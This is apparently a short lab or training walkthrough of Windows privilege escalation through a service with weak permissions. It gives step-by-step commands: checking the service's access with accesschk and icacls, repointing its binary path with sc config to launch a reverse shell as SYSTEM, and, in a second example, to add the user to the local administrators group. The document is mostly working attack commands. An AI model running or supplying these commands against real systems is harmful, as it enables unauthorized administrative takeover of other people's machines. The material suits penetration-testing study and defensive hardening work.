
**Example 1:**

1. **Check Service Permissions:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
   ```
   - This checks the "user" account's permissions on the "daclsvc" service.

2. **Verify Permissions Using icacls:**
   ```plaintext
   icacls "C:\Program Files\DACL Service\"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the service to be vulnerable.

3. **Identify Vulnerability:**
   - The "user" account can change the service configuration (SERVICE_CHANGE_CONFIG).

4. **Query Service Configuration:**
   ```plaintext
   sc qc daclsvc
   ```
   - Verifies that the service runs with SYSTEM privileges.

5. **Modify Service Binary Path:**
   ```plaintext
   sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
   ```
   - Sets the service to execute `reverse.exe` on start.

6. **Exploit:**
   - Start a listener on Kali.
   - Start the service:
     ```plaintext
     net start daclsvc
     ```
   - This spawns a reverse shell with SYSTEM privileges.

**Example 2:**

1. **Modify Service to Add User to Admin Group:**
   ```plaintext
   sc config daclsvc binpath= "net localgroup administrators user /add"
   ```

2. **Start the Service:**
   ```plaintext
   sc start daclsvc
   ```

3. **Verify:**
   ```plaintext
   net localgroup administrators
   ```
   - Confirms the user was added to the local administrators group.
